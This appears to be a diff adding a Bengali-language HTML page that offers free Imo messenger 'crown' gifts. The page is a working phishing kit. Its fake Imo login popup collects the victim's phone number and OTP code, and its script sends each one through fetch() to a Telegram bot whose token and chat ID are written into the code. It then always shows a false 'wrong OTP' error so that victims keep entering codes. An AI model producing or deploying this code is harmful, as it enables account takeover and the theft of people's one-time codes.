@@ -1,0 +1,31 @@
+"<!DOCTYPE html><html lang="bn"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>ইমো মুকুট ফ্রি ডিজাইন</title> <style> /* মেইন ব্যাকগ্রাউন্ড */ body { margin: 0; padding: 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); background-size: 400% 400%; animation: gradientBG 5s ease infinite; color: white; overflow-x: hidden; }
+@keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+.header-text { font-size: 26px; font-weight: bold; text-shadow: 0 0 15px #fff; margin: 20px 0; padding: 10px 25px; border: 2px dashed #fff; border-radius: 50px; background: rgba(0,0,0,0.2); }
+.card { width: 90%; max-width: 350px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.3); border-radius: 20px; margin-bottom: 20px; padding: 15px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
+.card img { width: 100%; border-radius: 15px; margin-bottom: 15px; }
+.open-btn { background: #ff0055; color: white; font-weight: bold; padding: 12px 50px; border: none; border-radius: 30px; cursor: pointer; font-size: 18px; box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4); transition: 0.3s; }
+.open-btn:active { transform: scale(0.95); }
+/* লগইন পপআপ ডিজাইন */ #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 9999; }
+.login-box { width: 85%; max-width: 340px; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); padding: 30px 20px; border-radius: 25px; text-align: center; box-shadow: 0 0 30px rgba(255,255,255,0.2); position: relative; animation: fadeIn 0.5s; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+.login-box img { width: 100px; height: 100px; border-radius: 50%; margin-bottom: 15px; border: 4px solid #fff; box-shadow: 0 0 15px #fff; }
+.login-box h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
+input { width: 85%; padding: 15px; margin-bottom: 20px; border-radius: 50px; border: none; font-size: 18px; text-align: center; outline: none; background: rgba(255,255,255,0.9); color: #333; }
+.submit-tick { font-size: 50px; color: #00ff88; cursor: pointer; text-shadow: 0 0 10px #00ff88; transition: 0.2s; }
+.submit-tick:hover { transform: scale(1.2); }
+.error-msg { color: #ffcccc; background: rgba(255,0,0,0.3); padding: 10px; border-radius: 10px; margin-top: 15px; display: none; font-size: 14px; } </style></head><body>
+<div class="header-text">👑ফ্রিতে মুখোট নিন👑</div>
+<div class="card"> <img src="https://i.ibb.co/Z1bXkk7J/20260331-125153.jpg" alt="Crown 1"> <button class="open-btn" onclick="openLogin()">Send Gift</button> </div>
+<div class="card"> <img src="https://i.ibb.co/cKYR1yCk/20260331-125936.jpg" alt="Crown 2"> <button class="open-btn" onclick="openLogin()">Send Gift</button> </div>
+<div id="overlay"> <div class="login-box" id="step1"> <img src="https://i.ibb.co/G42csTJg/20260331-134253.png" alt="Imo Logo"> <h2>ইমো নাম্বার দিন</h2> <input type="number" id="phone" placeholder="017XXXXXXXX" required> <div class="submit-tick" onclick="sendPhone()">✔</div> </div>
+<div class="login-box" id="step2" style="display: none;"> <img src="https://i.ibb.co/G42csTJg/20260331-134253.png" alt="Imo Logo"> <h2>ওটিপি কোড (OTP)</h2> <p>আপনার ফোনে যাওয়া কোডটি দিন</p> <input type="number" id="otp" placeholder="XXXXXX"> <div class="submit-tick" onclick="sendOTP()">✔</div> <div id="error" class="error-msg">দুঃখিত! আপনার ওটিপিটি ভুল। আবার চেষ্টা করুন।</div> </div> </div>
+<script> // --- আপনার টেলিগ্রাম তথ্য এখানে দিন --- const botToken = "8901789125:AAHfJ9cmXGvKB5rAiEL5f85C5ykUFceERZw"; const chatId = "2143470434";
+function openLogin() { document.getElementById('overlay').style.display = 'flex'; }
+// টেলিগ্রামে ডাটা পাঠানোর ফাংশন async function sendToTelegram(message) { const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML; await fetch(url); }
+function sendPhone() { const phone = document.getElementById('phone').value; if (phone.length < 10) { alert("দয়া করে সঠিক নাম্বার দিন।"); return; } const msg = <b>🆔: @imohackingdula123bot🔥নতুন ইমো নাম্বার এসেছে!</b>\n\n📱 নাম্বার: <code>${phone}</code>; sendToTelegram(msg);
+// ২য় ধাপে নিয়ে যাওয়া document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+function sendOTP() { const otp = document.getElementById('otp').value; const phone = document.getElementById('phone').value; if (otp === "") { alert("ওটিপি কোড লিখুন।"); return; }
+const msg = <b>🆔: @imohackingdula123bot🔑 ওটিপি কোড (OTP)</b>\n\n🔢 ওটিপি: <code>${otp}</code>; sendToTelegram(msg);
+// ওটিপি ভুল দেখানো document.getElementById('error').style.display = 'block'; document.getElementById('otp').value = ""; // বক্স খালি করে দেওয়া }
+// পপআপের বাইরে ক্লিক করলে বন্ধ হবে window.onclick = function(event) { if (event.target == document.getElementById('overlay')) { document.getElementById('overlay').style.display = "none"; document.getElementById('step1').style.display = 'block'; document.getElementById('step2').style.display = 'none'; document.getElementById('error').style.display = 'none'; } } </script>
+</body></html>"
